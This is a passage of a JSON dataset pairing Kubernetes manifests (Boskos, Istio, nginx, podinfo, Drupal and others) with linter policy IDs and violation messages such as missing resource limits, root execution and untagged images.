    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: prow\n    component: boskos-reaper\n  namespace: ci\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: boskos-reaper\n  template:\n    metadata:\n      labels:\n        app: prow\n        component: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-staging-boskos/reaper:v20211015-2401f5c\n        args:\n        - --boskos-url=http://boskos\n        - --resource-type=aws-quota-slice,azure4-quota-slice,azure-2-quota-slice,azurestack-quota-slice,gcp-quota-slice,libvirt-ppc64le-quota-slice,libvirt-s390x-quota-slice,openstack-quota-slice,openstack-kuryr-quota-slice,openstack-vexxhost-quota-slice,openstack-vh-mecha-central-quota-slice,openstack-vh-mecha-az0-quota-slice,openstack-ppc64le-quota-slice,vsphere-quota-slice,ovirt-quota-slice,packet-quota-slice,packet-edge-quota-slice,kubevirt-quota-slice,openstack-osuosl-quota-slice,aws-cpaas-quota-slice,hypershift-quota-slice,alibaba-quota-slice,aws-2-quota-slice,aws-arm64-quota-slice,azurestack-quota-slice,gcp-openshift-gce-devel-ci-2-quota-slice,ibmcloud-quota-slice,metal-quota-slice,osd-ephemeral-quota-slice,ovirt-upgrade-quota-slice,aws-china-quota-slice,aws-usgov-quota-slice,vsphere-discon-quota-slice\n        - --target-state=free\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"boskos-reaper\" has memory limit 0"
  },
  {
    "id": "7547",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7548",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hyperkube\" does not have a read-only root file system"
  },
  {
    "id": "7549",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"istio-security-post-install-account\" not found"
  },
  {
    "id": "7550",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hyperkube\" is not set to runAsNonRoot"
  },
  {
    "id": "7551",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hyperkube\" has cpu request 0"
  },
  {
    "id": "7552",
    "manifest_path": "data/manifests/the_stack_sample/sample_2767.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  annotations:\n    helm.sh/hook: post-install\n    helm.sh/hook-delete-policy: hook-succeeded\n  labels:\n    app: istio-security\n    release: istio\n  name: istio-security-post-install\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: istio-security\n        release: istio\n      name: istio-security-post-install\n    spec:\n      containers:\n      - command:\n        - /bin/bash\n        - /tmp/security/run.sh\n        - /tmp/security/custom-resources.yaml\n        image: quay.io/coreos/hyperkube:v1.7.6_coreos.0\n        name: hyperkube\n        volumeMounts:\n        - mountPath: /tmp/security\n          name: tmp-configmap-security\n      serviceAccountName: istio-security-post-install-account\n      volumes:\n      - configMap:\n          name: istio-security-custom-resources\n        name: tmp-configmap-security\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hyperkube\" has memory limit 0"
  },
  {
    "id": "7553",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx-container\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7554",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 6 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "7555",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-container\" does not have a read-only root file system"
  },
  {
    "id": "7556",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-container\" is not set to runAsNonRoot"
  },
  {
    "id": "7557",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-container\" has cpu request 0"
  },
  {
    "id": "7558",
    "manifest_path": "data/manifests/the_stack_sample/sample_2771.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: mywebsite\n    tier: frontend\nspec:\n  template:\n    metadata:\n      name: myapp-pod\n      labels:\n        app: myapp\n    spec:\n      containers:\n      - name: nginx-container\n        image: nginx\n  replicas: 6\n  selector:\n    matchLabels:\n      app: myapp\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-container\" has memory limit 0"
  },
  {
    "id": "7559",
    "manifest_path": "data/manifests/the_stack_sample/sample_2772.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: influxdb\n  labels:\n    service: influxdb\nspec:\n  selector:\n    service: influxdb\n  type: ClusterIP\n  ports:\n  - port: 8083\n    name: secondary-port\n    protocol: TCP\n    targetPort: 8083\n  - port: 8086\n    name: primary-port\n    protocol: TCP\n    targetPort: 8086\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:influxdb])"
  },
  {
    "id": "7560",
    "manifest_path": "data/manifests/the_stack_sample/sample_2773.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: acid-minimal-cluster-pooler\n  labels:\n    application: db-connection-pooler\n    connection-pooler: acid-minimal-cluster-pooler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: db-connection-pooler\n      connection-pooler: acid-minimal-cluster-pooler\n      cluster-name: acid-minimal-cluster\n  template:\n    metadata:\n      labels:\n        application: db-connection-pooler\n        connection-pooler: acid-minimal-cluster-pooler\n        cluster-name: acid-minimal-cluster\n    spec:\n      serviceAccountName: postgres-operator\n      containers:\n      - name: postgres-operator\n        image: registry.opensource.zalan.do/acid/pgbouncer:master-16\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 250Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env: []\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"postgres-operator\" does not have a read-only root file system"
  },
  {
    "id": "7561",
    "manifest_path": "data/manifests/the_stack_sample/sample_2773.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: acid-minimal-cluster-pooler\n  labels:\n    application: db-connection-pooler\n    connection-pooler: acid-minimal-cluster-pooler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: db-connection-pooler\n      connection-pooler: acid-minimal-cluster-pooler\n      cluster-name: acid-minimal-cluster\n  template:\n    metadata:\n      labels:\n        application: db-connection-pooler\n        connection-pooler: acid-minimal-cluster-pooler\n        cluster-name: acid-minimal-cluster\n    spec:\n      serviceAccountName: postgres-operator\n      containers:\n      - name: postgres-operator\n        image: registry.opensource.zalan.do/acid/pgbouncer:master-16\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 250Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env: []\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"postgres-operator\" not found"
  },
  {
    "id": "7562",
    "manifest_path": "data/manifests/the_stack_sample/sample_2773.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: acid-minimal-cluster-pooler\n  labels:\n    application: db-connection-pooler\n    connection-pooler: acid-minimal-cluster-pooler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: db-connection-pooler\n      connection-pooler: acid-minimal-cluster-pooler\n      cluster-name: acid-minimal-cluster\n  template:\n    metadata:\n      labels:\n        application: db-connection-pooler\n        connection-pooler: acid-minimal-cluster-pooler\n        cluster-name: acid-minimal-cluster\n    spec:\n      serviceAccountName: postgres-operator\n      containers:\n      - name: postgres-operator\n        image: registry.opensource.zalan.do/acid/pgbouncer:master-16\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 100m\n            memory: 250Mi\n          limits:\n            cpu: 500m\n            memory: 500Mi\n        env: []\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"postgres-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "7563",
    "manifest_path": "data/manifests/the_stack_sample/sample_2775.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\n  labels:\n    app: guestbook\n    tier: frontend\nspec:\n  type: NodePort\n  ports:\n  - port: 80\n    targetPort: 8888\n    nodePort: 30000\n    protocol: TCP\n  selector:\n    app: guestbook\n    tier: frontend\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:guestbook tier:frontend])"
  },
  {
    "id": "7564",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "7565",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "7566",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "7567",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "7568",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "7569",
    "manifest_path": "data/manifests/the_stack_sample/sample_2776.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n  annotations:\n    fluxcd.io/automated: 'true'\n    fluxcd.io/tag.init: regex:^3.10.*\n    fluxcd.io/tag.podinfod: semver:~3.1\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9797'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.10\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:3.1.5\n        imagePullPolicy: IfNotPresent\n        ports:\n        - name: http\n          containerPort: 9898\n          protocol: TCP\n        - name: http-metrics\n          containerPort: 9797\n          protocol: TCP\n        - name: grpc\n          containerPort: 9999\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --port-metrics=9797\n        - --grpc-port=9999\n        - --grpc-service-name=podinfo\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        - -- ui-message='Welcome to FLux'\n        env:\n        - name: PODINFO_UI_COLOR\n          value: '#34577c'\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "7570",
    "manifest_path": "data/manifests/the_stack_sample/sample_2777.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: drupal\n  labels:\n    app: drupal\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: drupal\n  template:\n    metadata:\n      labels:\n        app: drupal\n    spec:\n      containers:\n      - image: drupal\n        name: drupal\n        env:\n        - name: DRUPAL_DB_HOST\n          value: mysql:3306\n        - name: DRUPAL_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 80\n          name: drupal\n        volumeMounts:\n        - name: drupal-persistent-storage\n          mountPath: /opt/drupal/web/sites/default/files\n      volumes:\n      - name: drupal-persistent-storage\n        persistentVolumeClaim:\n          claimName: drupal-volumeclaim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"drupal\" is using an invalid container image, \"drupal\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7571",
    "manifest_path": "data/manifests/the_stack_sample/sample_2777.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: drupal\n  labels:\n    app: drupal\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: drupal\n  template:\n    metadata:\n      labels:\n        app: drupal\n    spec:\n      containers:\n      - image: drupal\n        name: drupal\n        env:\n        - name: DRUPAL_DB_HOST\n          value: mysql:3306\n        - name: DRUPAL_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 80\n          name: drupal\n        volumeMounts:\n        - name: drupal-persistent-storage\n          mountPath: /opt/drupal/web/sites/default/files\n      volumes:\n      - name: drupal-persistent-storage\n        persistentVolumeClaim:\n          claimName: drupal-volumeclaim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"drupal\" does not have a read-only root file system"
  },
  {
    "id": "7572",
    "manifest_path": "data/manifests/the_stack_sample/sample_2777.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: drupal\n  labels:\n    app: drupal\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: drupal\n  template:\n    metadata:\n      labels:\n        app: drupal\n    spec:\n      containers:\n      - image: drupal\n        name: drupal\n        env:\n        - name: DRUPAL_DB_HOST\n          value: mysql:3306\n        - name: DRUPAL_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 80\n          name: drupal\n        volumeMounts:\n        - name: drupal-persistent-storage\n          mountPath: /opt/drupal/web/sites/default/files\n      volumes:\n      - name: drupal-persistent-storage\n        persistentVolumeClaim:\n          claimName: drupal-volumeclaim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"drupal\" is not set to runAsNonRoot"
  },
  {
    "id": "7573",
    "manifest_path": "data/manifests/the_stack_sample/sample_2777.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: drupal\n  labels:\n    app: drupal\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: drupal\n  template:\n    metadata:\n      labels:\n        app: drupal\n    spec:\n      containers:\n      - image: drupal\n        name: drupal\n        env:\n        - name: DRUPAL_DB_HOST\n          value: mysql:3306\n        - name: DRUPAL_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 80\n          name: drupal\n        volumeMounts:\n        - name: drupal-persistent-storage\n          mountPath: /opt/drupal/web/sites/default/files\n      volumes:\n      - name: drupal-persistent-storage\n        persistentVolumeClaim:\n          claimName: drupal-volumeclaim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"drupal\" has cpu request 0"
  },
  {
    "id": "7574",
    "manifest_path": "data/manifests/the_stack_sample/sample_2777.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: drupal\n  labels:\n    app: drupal\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: drupal\n  template:\n    metadata:\n      labels:\n        app: drupal\n    spec:\n      containers:\n      - image: drupal\n        name: drupal\n        env:\n        - name: DRUPAL_DB_HOST\n          value: mysql:3306\n        - name: DRUPAL_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql\n              key: password\n        ports:\n        - containerPort: 80\n          name: drupal\n        volumeMounts:\n        - name: drupal-persistent-storage\n          mountPath: /opt/drupal/web/sites/default/files\n      volumes:\n      - name: drupal-persistent-storage\n        persistentVolumeClaim:\n          claimName: drupal-volumeclaim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"drupal\" has memory limit 0"
  },
  {
    "id": "7575",
    "manifest_path": "data/manifests/the_stack_sample/sample_2778.yaml",
